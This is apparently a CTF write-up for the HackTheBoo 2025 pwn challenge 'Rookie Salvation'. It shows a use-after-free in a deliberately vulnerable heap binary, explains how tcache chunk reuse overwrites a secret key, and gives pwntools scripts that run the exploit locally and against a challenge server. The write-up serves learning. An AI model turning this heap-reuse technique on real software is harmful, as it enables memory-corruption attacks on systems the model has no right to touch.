---
title: "HackTheBoo CTF 2025 | Pwn: Rookie Salvation [medium]"
date: 2025-10-27
summary: "HackTheBoo 2025 CTF Pwn — Rookie Salvation"
description: "Reclaiming a freed heap chunk via tcache to rewrite the secret key and unlock the salvation path for the flag."
weight: 20
tags:
  - HackTheBox
  - HackTheBoo 2025
  - Pwn
  - Heap Exploitation
  - x86_64
categories:
  - HackTheBoo 2025
  - Pwn
draft: false
---

Rook’s last stand against NEMEGHAST begins now. This is no longer a simulation—it’s the collapse of control. Legend speaks of only one entity who ever broke free from the Matrix: the original architect of NEMEGHAST. His name—buried, forbidden, encrypted—was the master key. If you can recover it… and inject it into the core... Rook will finally be free.

## Step 1: Explore the Challenge Files

```
ls
file rookie_salvation
cat README.txt
```

Findings:

- Only one ELF (`rookie_salvation`) plus flavor text.
- 64-bit dynamically linked PIE, NX and stack canary enabled, so a classic ret2win is unlikely.

## Step 2: Baseline Protections and UX

```
checksec --file=rookie_salvation
./rookie_salvation
```

`checksec` confirms **Full RELRO**, **Canary**, **NX**, **PIE**. Running the binary shows the three-option:

```
+-------------------+
| [1] Reserve space |
| [2] Obliterate    |
| [3] Escape        |
+-------------------+
```

Option 3 invokes the salvation check, so the vulnerability must involve options 1 and 2.

## Step 3: Static Reconnaissance

Enumerate symbols and dive into the interesting functions with radare2.

```
nm -C rookie_salvation
r2 -q -c 'aaa; e scr.color=false; s sym.reserve_space; pdf' rookie_salvation
r2 -q -c 'aaa; e scr.color=false; s sym.obliterate; pdf' rookie_salvation
r2 -q -c 'aaa; e scr.color=false; s sym.road_to_salvation; pdf' rookie_salvation
```

Key observations:

- `main` allocates a single heap chunk (`malloc(0x26)`) and stores its pointer in the global `allocated_space`. The bytes at `allocated_space + 0x1e` are initialized to the string `"deadbeef"`.
- **reserve_space**
  - Prompts for a size, `malloc`s that size, and lets us `scanf("%s")` directly into the new chunk.
  - Never updates the global `allocated_space`; it only stores the pointer in a local variable.
- **obliterate** calls `free(allocated_space)` without nulling the pointer.
- **road_to_salvation** compares `strcmp((char*)(allocated_space+0x1e), "w3th4nds")`. If it matches, the function opens `flag.txt`; otherwise loop back to menu.

This sets up a **dangling pointer**: after `obliterate`, the global pointer remains, but the chunk returns to the tcache and can be reclaimed via `reserve_space`.

## Step 4: Exploitation Strategy

1. **Obliterate** the original chunk so it enters the tcache bin for size 0x30.
2. **Reserve** a new chunk of a compatible size (decimal 40 in the menu suffices – glibc rounds to the same 0x30 size class).
3. Because the freed chunk is first in the tcache list, the new allocation reuses the exact same address still stored in `allocated_space`.
4. When we input data for the new chunk, we overwrite the bytes at offset `0x1e`, effectively rewriting the salvation key that `road_to_salvation` will later verify.
5. Trigger option 3 to read the flag.


## Step 5: Local Proof of Concept

Use pwntools to script the menu sequence and confirm that replacing the secret with `w3th4nds` prints the local fake flag.

```
from pwn import *
context.log_level = 'debug'
elf = ELF('./rookie_salvation', checksec=False)

io = process(elf.path)
io.recvuntil(b'> ')
io.sendline(b'2')
io.recvuntil(b'> ')
io.sendline(b'1')
io.recvuntil(b': ')
io.sendline(b'40')
io.recvuntil(b': ')
io.sendline(b'A'*30 + b'w3th4nds')
io.recvuntil(b'> ')
io.sendline(b'3')
print(io.recvrepeat(1).decode())
io.close()
```

Output:

```
[Unknown Voice] ✨ 𝐅𝐢𝐧𝐚𝐥𝐥𝐲.. 𝐓𝐡𝐞 𝐰𝐚𝐲.. 𝐎𝐮𝐭..HHTB{f4k3_fl4g_4_t35t1ng}
```

The local binary with a dummy flag, confirming that the logic works.

## Step 6: Exploit


```
from pwn import *

context.binary = ELF("./rookie_salvation", checksec=False)
context.log_level = "info"

HOST = "209.38.254.18"
PORT = 31337


def forge_key(io):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", b"40")
    payload = b"A" * 0x1E + b"w3th4nds"
    io.sendlineafter(b": ", payload)
    io.sendlineafter(b"> ", b"3")
    io.recvuntil(b"HTB{")
    flag = b"HTB{" + io.recvuntil(b"}")
    log.success(flag.decode())


def main():
    io = remote(HOST, PORT)
    forge_key(io)


if __name__ == "__main__":
    main()
```


Run the script 

```
python3 exploit.py
```


```
[+] Opening connection to 209.38.254.18 on port 31337: Done
[+] HTB{h34p_2_h34v3n}
[*] Closed connection to 209.38.254.18 port 31337
```
